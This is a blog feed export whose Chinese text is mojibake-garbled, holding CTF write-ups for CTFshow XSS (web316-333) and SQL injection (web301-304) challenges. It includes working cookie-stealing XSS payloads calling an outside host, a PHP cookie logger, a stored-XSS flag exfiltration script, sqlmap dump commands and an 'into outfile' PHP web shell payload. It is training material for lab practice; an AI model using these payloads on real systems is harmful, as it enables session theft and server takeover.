<?xml version="1.0" encoding="utf-8"?>
<search> 
  
  
    
    <entry>
      <title>web316-web333XSSç¯‡</title>
      <link href="/2023/09/20/web316-web333XSS%E7%AF%87/"/>
      <url>/2023/09/20/web316-web333XSS%E7%AF%87/</url>
      
        <content type="html"><![CDATA[<h1 id="æå‰å‡†å¤‡"><a href="#æå‰å‡†å¤‡" class="headerlink" title="æå‰å‡†å¤‡"></a>æå‰å‡†å¤‡</h1><p>å‡†å¤‡å‡ ä¸ªXSSæ³¨å…¥ç½‘ç«™ï¼š<br>å¦‚<a href="https://xsshs.cn/%EF%BC%8Chttps://xss.pt/%EF%BC%8Chttp://xsscom.com%E5%8E%BB%E7%94%9F%E6%88%90xss%E9%93%BE%E6%8E%A5">https://xsshs.cn/ï¼Œhttps://xss.pt/ï¼Œhttp://xsscom.comå»ç”Ÿæˆxssé“¾æ¥</a><br>å½“ç„¶ï¼Œé™¤æ­¤ä¹‹å¤–ï¼Œä¹Ÿå¯ä»¥è‡ªå·±ç¼–å†™ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><h1 id="web316"><a href="#web316" class="headerlink" title="web316"></a>web316</h1><p>åå°botä¼šè‡ªåŠ¨è®¿é—®ä½ çš„è¿æ¥ï¼Œæˆ‘ä»¬åªéœ€è¦å†™ä¸€æ®µæ¶æ„XSSå†…å®¹å³å¯ã€‚<br>è¿™é‡Œç”¨<a href="https://xss.pt/">https://xss.pt/</a>è¿›è¡Œå¤ç°ã€‚<br>æ³¨å†Œå¥½åï¼Œåˆ›å»ºé¡¹ç›®ä¹‹åï¼ŒæŠŠè·å–cookieæ·»åŠ ä¸Šã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695119320621-77e0dee8-617b-4248-a848-74d42e647038.png" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695119451635-6630fbfb-343a-44ed-9546-687032cca715.png" alt="image.png"><br>å¥½åƒæŠ“åˆ°çš„æ˜¯è‡ªå·±ğŸ¤”ã€‚<br>é‚£å°±è¯•ä¸€è¯•å†™åœ¨è‡ªå·±çš„VPSä¸Šã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$cookie</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;cookie&#x27;</span>];</span><br><span class="line"><span class="variable">$log</span> = <span class="title function_ invoke__">fopen</span>(<span class="string">&quot;cookie.txt&quot;</span>, <span class="string">&quot;a&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fwrite</span>(<span class="variable">$log</span>, <span class="variable">$cookie</span> . <span class="string">&quot;\n&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">fclose</span>(<span class="variable">$log</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>payloadï¼š<code>&lt;script&gt;document.location.href=&quot;http://ip/xss.php?cookie=&quot;+document.cookie&lt;/script&gt;</code><br>ä¼ å…¥å°±å¯ä»¥å¾—åˆ°éœ€è¦çš„flagäº†ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695124984710-47892421-05e0-4546-83f6-31706a597d5a.png" alt="image.png"></p><h1 id="web317"><a href="#web317" class="headerlink" title="web317"></a>web317</h1><p>è¿‡æ»¤äº†scriptï¼Œéšä¾¿æ¢ä¸€ä¸ªæ ‡ç­¾åç§°å°±è¡Œäº†ï¼Œæ¯”å¦‚inputï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=<span class="string">&quot;window.open(&#x27;http://natro92.top/xss.php?cookie=&#x27;+document.cookie)&quot;</span> autofocus&gt;</span><br></pre></td></tr></table></figure><p>é€šè¿‡autofocuså±æ€§æ‰§è¡Œæœ¬èº«çš„focusäº‹ä»¶ï¼Œè¿™ä¸ªå‘é‡æ˜¯ä½¿ç„¦ç‚¹è‡ªåŠ¨è·³åˆ°è¾“å…¥å…ƒç´ ä¸Š,è§¦å‘ç„¦ç‚¹äº‹ä»¶ï¼Œæ— éœ€ç”¨æˆ·å»è§¦å‘</p><h2 id="å…¶ä»–æ¥å…¥æ–¹æ³•"><a href="#å…¶ä»–æ¥å…¥æ–¹æ³•" class="headerlink" title="å…¶ä»–æ¥å…¥æ–¹æ³•"></a>å…¶ä»–æ¥å…¥æ–¹æ³•</h2><p>å…¶ä»–çš„æ–¹æ³•ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;svg onload=<span class="string">&quot;window.open(&#x27;http://ip/&#x27;+document.cookie)&quot;</span>&gt;</span><br><span class="line">&lt;iframe onload=<span class="string">&quot;window.open(&#x27;http://ip/&#x27;+document.cookie)&quot;</span>&gt;&lt;/iframe&gt;</span><br><span class="line">&lt;body onload=<span class="string">&quot;window.open(&#x27;http://ip/&#x27;+document.cookie)&quot;</span>&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>ç”¨ä¸Šé¢è¿™ç§æ–¹æ³•ç›´æ¥ç”¨ncæ¥å°±è¡Œï¼Œæˆ–è€…pythonçš„æœåŠ¡å™¨ã€‚</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python3 -m http.server <span class="number">39543</span></span><br></pre></td></tr></table></figure><h3 id="æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ï¼Œæˆ‘æœ€å¼€å§‹æµ‹è¯•ï¼Œæ— è®ºncè¿˜æ˜¯ä»€ä¹ˆéƒ½æ˜¯ä¸è¡Œçš„ï¼Œæƒ³äº†ä¸€ä¸‹æ‰æƒ³èµ·æ¥ï¼Œvpsæ˜¯æœ‰é˜²ç«å¢™çš„ï¼Œå¦‚æœä½ æ²¡æœ‰åœ¨é˜¿é‡Œäº‘æˆ–è€…å…¶ä»–äº‘å¹³å°å¼€æ”¾ç«¯å£æ˜¯æ‰“ä¸è¿›æ¥çš„ã€‚"><a href="#æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ï¼Œæˆ‘æœ€å¼€å§‹æµ‹è¯•ï¼Œæ— è®ºncè¿˜æ˜¯ä»€ä¹ˆéƒ½æ˜¯ä¸è¡Œçš„ï¼Œæƒ³äº†ä¸€ä¸‹æ‰æƒ³èµ·æ¥ï¼Œvpsæ˜¯æœ‰é˜²ç«å¢™çš„ï¼Œå¦‚æœä½ æ²¡æœ‰åœ¨é˜¿é‡Œäº‘æˆ–è€…å…¶ä»–äº‘å¹³å°å¼€æ”¾ç«¯å£æ˜¯æ‰“ä¸è¿›æ¥çš„ã€‚" class="headerlink" title="æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ï¼Œæˆ‘æœ€å¼€å§‹æµ‹è¯•ï¼Œæ— è®ºncè¿˜æ˜¯ä»€ä¹ˆéƒ½æ˜¯ä¸è¡Œçš„ï¼Œæƒ³äº†ä¸€ä¸‹æ‰æƒ³èµ·æ¥ï¼Œvpsæ˜¯æœ‰é˜²ç«å¢™çš„ï¼Œå¦‚æœä½ æ²¡æœ‰åœ¨é˜¿é‡Œäº‘æˆ–è€…å…¶ä»–äº‘å¹³å°å¼€æ”¾ç«¯å£æ˜¯æ‰“ä¸è¿›æ¥çš„ã€‚"></a>æ³¨æ„è¿™é‡Œæœ‰ä¸€ä¸ªå°å‘ï¼Œæˆ‘æœ€å¼€å§‹æµ‹è¯•ï¼Œæ— è®ºncè¿˜æ˜¯ä»€ä¹ˆéƒ½æ˜¯ä¸è¡Œçš„ï¼Œæƒ³äº†ä¸€ä¸‹æ‰æƒ³èµ·æ¥ï¼Œvpsæ˜¯æœ‰é˜²ç«å¢™çš„ï¼Œå¦‚æœä½ æ²¡æœ‰åœ¨é˜¿é‡Œäº‘æˆ–è€…å…¶ä»–äº‘å¹³å°å¼€æ”¾ç«¯å£æ˜¯æ‰“ä¸è¿›æ¥çš„ã€‚</h3><p>åŒç†ï¼Œä½¿ç”¨ncä¹Ÿæ˜¯å¯ä»¥è¾¾åˆ°æ•ˆæœçš„ï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -vlp <span class="number">8888</span></span><br></pre></td></tr></table></figure><p>payloadä¹Ÿå°±å¯ä»¥ç®€ä¾¿ä¸ºï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=<span class="string">&quot;window.open(&#x27;http://xxx/&#x27;+document.cookie)&quot;</span> autofocus&gt;</span><br></pre></td></tr></table></figure><p>å¯èƒ½æ…¢ä¸€ç‚¹ï¼Œå¤šåˆ·æ–°ã€‚<br>æ—¢ç„¶å¦‚æ­¤ï¼Œdnslogä¼°è®¡ä¹Ÿæ˜¯å¯ä»¥ç”¨çš„ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695126147714-c32fc3cd-7d65-48ae-9e80-43ef0c43a361.png" alt="image.png"></p><h1 id="web318-319"><a href="#web318-319" class="headerlink" title="web318-319"></a>web318-319</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input onfocus=<span class="string">&quot;window.open(&#x27;http://xxx/&#x27;+document.cookie)&quot;</span> autofocus&gt;</span><br></pre></td></tr></table></figure><h1 id="web320-web326"><a href="#web320-web326" class="headerlink" title="web320-web326"></a>web320-web326</h1><h3 id="è¿‡æ»¤æ‰äº†ç©ºæ ¼"><a href="#è¿‡æ»¤æ‰äº†ç©ºæ ¼" class="headerlink" title="è¿‡æ»¤æ‰äº†ç©ºæ ¼"></a>è¿‡æ»¤æ‰äº†ç©ºæ ¼</h3><p>ç»•è¿‡æ–¹æ³•ï¼š</p><ul><li>TAB</li><li>/</li><li>/**/</li></ul><p>payloadï¼š</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input<span class="comment">/**/</span>onfocus=<span class="string">&quot;window.open(&#x27;http://xxx/&#x27;+document.cookie)&quot;</span><span class="comment">/**/</span>autofocus&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695126464239-47f3ca03-ec5d-4961-9b18-3dc47b1c66a4.png" alt="image.png"></p><h1 id="web327"><a href="#web327" class="headerlink" title="web327"></a>web327</h1><p>å­˜å‚¨å‹XSSï¼Œè¿˜æ˜¯ç”¨ä¹‹å‰payloadã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695197738252-7c67bfec-c105-456d-9778-42cf8a5000bd.png" alt="image.png"><br>è¿™é‡Œéœ€è¦ç»™adminå‘ä¿¡æ¯ï¼Œæ„æ€å¤§æ¦‚æ˜¯è·å–adminçš„cookieã€‚</p><h1 id="web328"><a href="#web328" class="headerlink" title="web328"></a>web328</h1><p>æœ‰ä¸ªç™»å½•é¡µé¢ï¼Œä½†æ˜¯ç™»ä¸ä¸Šå»ï¼Œæ—è¾¹æœ‰ä¸ªæ³¨å†Œï¼Œæ³¨å†Œçš„ç”¨æˆ·ç®¡ç†ç”¨æˆ·åä¼šè¢«ç®¡ç†å‘˜æ£€æµ‹åˆ°ã€‚å› æ­¤å°†payloadæ”¾å…¥ç”¨æˆ·åä¸­ã€‚<br>è™½ç„¶æ²¡æœ‰flagï¼Œä½†æ˜¯æœ‰cookieï¼Œå°è¯•ç™»å½•ä¸€ä¸‹ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695198046512-23757c3e-2857-4e97-bd9d-c5701b0664ed.png" alt="image.png"><br><code>PHPSESSID=7e8jf9pathne9tvgnb02kvj4h9</code><br>åœ¨hackbarä¸­ä¼ å…¥çš„cookieæ˜¯ä¸´æ—¶çš„è€Œä¸”æ²¡æœ‰åˆ é™¤æ‰æœ¬åœ°çš„cookieï¼Œæˆ‘ä»¬éœ€è¦å†™åˆ°å­˜å‚¨ä¸­ï¼Œå¹¶åˆ é™¤æ‰åŸæœ‰cookieå€¼ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695198320206-54b159b1-0fc0-4e57-a6d0-e07eea04be56.png" alt="image.png"><br>ç„¶åå°±èƒ½çœ‹åˆ°cookieäº†ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695198380472-3e891c60-8ccc-4786-a7d8-df3e5e448741.png" alt="image.png"></p><h1 id="web329"><a href="#web329" class="headerlink" title="web329"></a>web329</h1><p>ç›´æ¥ç”¨ä¹‹å‰çš„æ–¹æ³•ï¼Œå¾—åˆ°çš„cookieæ˜¯å‰ä¸€æ¬¡çš„cookieï¼ˆç®¡ç†å‘˜æ‰“å¼€ä¹‹åç«‹å³é€€å‡ºäº†ç™»å½•ï¼‰ï¼Œcookieåˆ·æ–°äº†ï¼Œä¹Ÿå°±å¤±æ•ˆäº†ã€‚<br>é‚£ç›´æ¥å†™æ®µjsï¼Œä½¿å…¶æ‰§è¡Œæ—¶è·å–åˆ°é¡µé¢çš„å…¶ä»–æ˜¾ç¤ºå¯†ç å³å¯ï¼ˆå› ä¸ºç®¡ç†å‘˜é¡µé¢æ˜¯æ˜¾ç¤ºå¯†ç çš„ã€‚ï¼‰ã€‚</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">document</span>.<span class="title function_">querySelectorAll</span>(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="title function_">forEach</span>(<span class="function"><span class="params">cell</span> =&gt;</span> &#123;</span><br><span class="line">  <span class="keyword">if</span> (cell.<span class="property">textContent</span>.<span class="title function_">startsWith</span>(<span class="string">&#x27;ctfshow&#123;&#x27;</span>)) &#123;</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(cell.<span class="property">textContent</span>); </span><br><span class="line">    <span class="variable language_">window</span>.<span class="title function_">open</span>(<span class="string">&#x27;http://xxx:8888/&#x27;</span>+cell.<span class="property">textContent</span>)</span><br><span class="line">  &#125;</span><br><span class="line">&#125;);</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å€™æˆ‘ä»¬æ³¨å†Œæµ‹è¯•ä¸€ä¸‹ã€‚<br>ä¸ºä»€ä¹ˆä¼šæ²¡æ¥åˆ°å‘¢ã€‚<br>è¯•ä¸€è¯•wpçš„å†™æ³•ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index,value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(value.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://ip/a.php?cookie=&#x27;</span>+value.<span class="property">innerHTML</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>æ€ªäº†ï¼Œè¿™ç§å°±å¯ä»¥ä¼ ä¸Šå»ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695199660892-dbce885c-b380-4a11-8983-c83e0530ab79.png" alt="image.png"><br>è¿™é‡Œé¢æœ‰æ–‡æœ¬å¹²æ‰°ï¼Œæ‰€ä»¥åœ¨æœ«å°¾æ·»åŠ ä¸€ä¸ª<code>&#123;</code>æ¥å®šå‘è·å–flagã€‚<br>ä¹Ÿå°±æ˜¯ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$(<span class="string">&#x27;.laytable-cell-1-0-1&#x27;</span>).<span class="title function_">each</span>(<span class="keyword">function</span>(<span class="params">index,value</span>)&#123;</span><br><span class="line">    <span class="keyword">if</span>(value.<span class="property">innerHTML</span>.<span class="title function_">indexOf</span>(<span class="string">&#x27;ctf&#x27;</span>+<span class="string">&#x27;show&#123;&#x27;</span>)&gt;-<span class="number">1</span>)&#123;</span><br><span class="line">        <span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://xxx:8888/&#x27;</span>+value.<span class="property">innerHTML</span>; </span><br><span class="line">    &#125;</span><br><span class="line">&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><p>è¿™æ—¶å°±èƒ½å¾—åˆ°flagäº†ã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695199955395-f485bb4c-bc69-4c16-b8bf-06f06312e8b5.png" alt="image.png"></p><h1 id="web330"><a href="#web330" class="headerlink" title="web330"></a>web330</h1><p>å¤šäº†ä¸€ä¸ªä¿®æ”¹å¯†ç ï¼Œç›´æ¥è®©ç®¡ç†å‘˜ä¿®æ”¹å¯†ç å³å¯ã€‚æŸ¥çœ‹è®¿é—®æ ¼å¼ï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200054149-497ab670-7c16-4715-b514-55c39f4d48c6.png" alt="image.png"></p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;<span class="variable language_">window</span>.<span class="property">location</span>.<span class="property">href</span>=<span class="string">&#x27;http://127.0.0.1/api/change.php?p=admin&#x27;</span>;&lt;/script&gt;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200186447-11c87ee9-ae07-4e41-baba-a650a282c683.png" alt="image.png"><br>æ³¨æ„ï¼Œå½“ç™»å½•ä¹‹åè®¿é—®é¡µé¢ä¹‹åå°±ä¼šå‘ç°ä¼šè·³è½¬åˆ°ä¿®æ”¹çš„é¡µé¢ï¼Œæ‰‹é€Ÿå¿«ç‚¹å¤åˆ¶ä¸‹æ¥ã€‚</p><h1 id="web331"><a href="#web331" class="headerlink" title="web331"></a>web331</h1><p>ä¸ä¸Šé¢˜ç±»ä¼¼ï¼Œä½†æ˜¯è¿™é‡Œä½¿ç”¨çš„æ˜¯postï¼š<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200377250-37dbc647-5bce-4151-af0a-c34dd3f7936f.png" alt="image.png"><br>ä¿®æ”¹ä¸€ä¸‹payloadå³å¯ï¼š</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;script&gt;$.<span class="title function_">ajax</span>(&#123;<span class="attr">url</span>:<span class="string">&#x27;api/change.php&#x27;</span>,<span class="attr">type</span>:<span class="string">&#x27;post&#x27;</span>,<span class="attr">data</span>:&#123;<span class="attr">p</span>:<span class="string">&#x27;admin&#x27;</span>&#125;&#125;);&lt;/script&gt;</span><br></pre></td></tr></table></figure><h1 id="web332"><a href="#web332" class="headerlink" title="web332"></a>web332</h1><p>ä¸ºä»€ä¹ˆç»™adminè½¬-99999å°±å˜æˆæ­£çš„äº†ï¼Œæœ‰ç‚¹æ‘¸ä¸åˆ°å¤´è„‘<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695200578624-04c33805-ec22-4736-8edf-da295212cbc1.png" alt="image.png"></p><h1 id="web333"><a href="#web333" class="headerlink" title="web333"></a>web333</h1><p>è‡ªå·±ç»™è‡ªå·±è½¬å¯ä»¥åŠ é’±ï¼Œä»€ä¹ˆè™šç©ºç§‘æŠ€ã€‚ç›´æ¥ä¸Šè„šæœ¬</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line">x=<span class="number">5</span></span><br><span class="line">url=<span class="string">&quot;http://e8e0aa13-bff2-4b78-a8cb-f7c0f0e73ae2.challenge.ctf.show/api/amount.php&quot;</span></span><br><span class="line">url2=<span class="string">&quot;http://e8e0aa13-bff2-4b78-a8cb-f7c0f0e73ae2.challenge.ctf.show/api/getFlag.php&quot;</span></span><br><span class="line">headers=&#123;<span class="string">&#x27;Cookie&#x27;</span>:<span class="string">&#x27;PHPSESSID=jkvcavn3fpfel2opl4afqdcepp&#x27;</span>&#125;  #è‡ªå·±ç™»å½•åçš„sessionid</span><br><span class="line"><span class="keyword">while</span> <span class="title class_">True</span>:</span><br><span class="line"><span class="title function_">print</span>(x)</span><br><span class="line">t=x-<span class="number">1</span></span><br><span class="line">data=&#123;</span><br><span class="line"><span class="string">&#x27;u&#x27;</span>:<span class="string">&#x27;user&#x27;</span>, #æ³¨å†Œçš„ç”¨æˆ·å</span><br><span class="line"><span class="string">&#x27;a&#x27;</span>:<span class="title function_">str</span>(t)</span><br><span class="line">&#125;</span><br><span class="line">r=requests.<span class="title function_">post</span>(url,headers=headers,data=data)</span><br><span class="line"><span class="title function_">print</span>(r.<span class="property">text</span>)</span><br><span class="line"><span class="keyword">if</span>(x&gt;<span class="number">10000</span>):</span><br><span class="line">r2=requests.<span class="title function_">get</span>(url2,headers=headers)</span><br><span class="line"><span class="title function_">print</span>(r2.<span class="property">text</span>)</span><br><span class="line"><span class="keyword">break</span></span><br><span class="line">x+=t</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1695201085660-c75cae90-a34e-4f7c-9dbd-1dcf457ecd52.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> WriteUp </tag>
            
            <tag> CTFshow0-1 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>web301-web310ä»£ç å®¡è®¡</title>
      <link href="/2023/09/17/web301-web310%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2023/09/17/web301-web310%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<h1 id="web301-302"><a href="#web301-302" class="headerlink" title="web301-302"></a>web301-302</h1><p>ä¸Šæ¥å°±æ˜¯ç™»å½•é¡µé¢ï¼Œçœ‹äº†ä»£ç å‘ç°æ²¡æœ‰è¿‡æ»¤ï¼Œå°è¯•ä½¿ç”¨sqlmapç›´æ¥å¼€æ³¨å…¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;select sds_password from sds_user where sds_username=&#x27;&quot;.$username.&quot;&#x27; order by id limit 1;&quot;;</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692710578502-cd8b5cd9-289d-4d3a-9320-2ac09591e7d5.png" alt="image.png"></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sqlmap -u http://e870d81c-dd88-4dc4-b990-760221d286bb.challenge.ctf.show/checklogin.php --data &#x27;userid=1&amp;userpwd=1&#x27; -D sds -C sds_password --dump --batch</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692712050115-fbdbfe16-279c-4760-924d-8f3686d25747.png" alt="image.png"><br>çœ‹çœ‹å¯†ç ï¼Œsqlmapè¿™ä¸ªå¿…é¡»ç›²æ³¨ï¼Œåªç›²äº†å¯†ç ï¼ŒçŒœè´¦å·ä¸ºadminã€‚<br>ç™»é™†æˆåŠŸã€‚<br><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692712078604-99fbc469-4f7b-41d5-9bce-b007a63bbaa8.png" alt="image.png"><br>ä½†æ˜¯ç™»å½•è¿›å…¥ä¹‹åæ²¡å•¥ç”¨ï¼Œä¼¼ä¹å¾—å†™å…¥shellã€‚<br>ä¹‹å‰è¿˜çœŸæ²¡æ€ä¹ˆç”¨è¿‡sqlå†™æ–‡ä»¶ï¼Œè¿™é‡Œè®°ä¸€ä¸‹ï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">userid=1&#x27;+union select &quot;&lt;?php eval($_POST[1]);?&gt;&quot; into outfile &quot;/var/www/html/a.php&quot;--+&amp;userpwd=1</span><br></pre></td></tr></table></figure><p>ç„¶åç›´æ¥rceå³å¯ã€‚</p><h1 id="web303"><a href="#web303" class="headerlink" title="web303"></a>web303</h1><p>è¿™å›å†™ä¸è¿›å»äº†ï¼Œè¿”å›äº†ä¸€ä¸²å­—ç¬¦ã€‚ç»§ç»­è¯»ä»£ç ã€‚<br>è´¦å·ä¼°è®¡è¿˜æ˜¯<code>admin</code>ï¼Œä½†æ˜¯sqlmapè¿›ä¸å»äº†ï¼Œé‚£å°±å°è¯•çˆ†ç ´ä¸€ä¸‹ï¼ŒçœŸè¿›å»äº†è¿˜ï¼Œå¯†ç å°±æ˜¯adminã€‚ï¼ˆåœ¨sqlæ–‡ä»¶ä¸­æœ‰ç™»å½•å¯†ç çš„md5çš„å€¼ï¼Œå¯ä»¥å»æ‰¾ç ´è§£ï¼‰<br>dptadd.phpä¸­æœ‰æ›´æ–°è¯­å¥ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$sql=&quot;insert into sds_dpt set sds_name=&#x27;&quot;.$dpt_name.&quot;&#x27;,sds_address =&#x27;&quot;.$dpt_address.&quot;&#x27;,sds_build_date=&#x27;&quot;.$dpt_build_year.&quot;&#x27;,sds_have_safe_card=&#x27;&quot;.$dpt_has_cert.&quot;&#x27;,sds_safe_card_num=&#x27;&quot;.$dpt_cert_number.&quot;&#x27;,sds_telephone=&#x27;&quot;.$dpt_telephone_number.&quot;&#x27;;&quot;;</span><br></pre></td></tr></table></figure><p>åœ¨dpt_nameé‡Œé¢æ’å…¥è¯­å¥ã€‚<br>postï¼š</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address =(select 1)#</span><br></pre></td></tr></table></figure><p><img src="https://cdn.nlark.com/yuque/0/2023/png/34866087/1692715850916-55750a4a-3948-4e0d-bb90-00b79ec1eae4.png" alt="image.png"><br>ä¾æ¬¡æŸ¥è¯¢å³å¯ã€‚</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address =(select group_concat(table_name) from information_schema.tables where table_schema=database())#</span><br></pre></td></tr></table></figure><blockquote><p>sds_dpt,sds_fl9g,sds_user</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address =(select group_concat(column_name) from information_schema.columns where table_name=&quot;sds_fl9g&quot;)#</span><br></pre></td></tr></table></figure><blockquote><p>flag</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">dpt_name=1&#x27;,sds_address =(select flag from sds_fl9g)#</span><br></pre></td></tr></table></figure><h1 id="web304"><a href="#web304" class="headerlink" title="web304"></a>web304</h1><p>æœ‰äº†waf</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">function sds_waf($str)&#123;</span><br><span class="line">return preg_match(&#x27;/[0-9]|[a-z]|-/i&#x27;, $str);</span><br><span 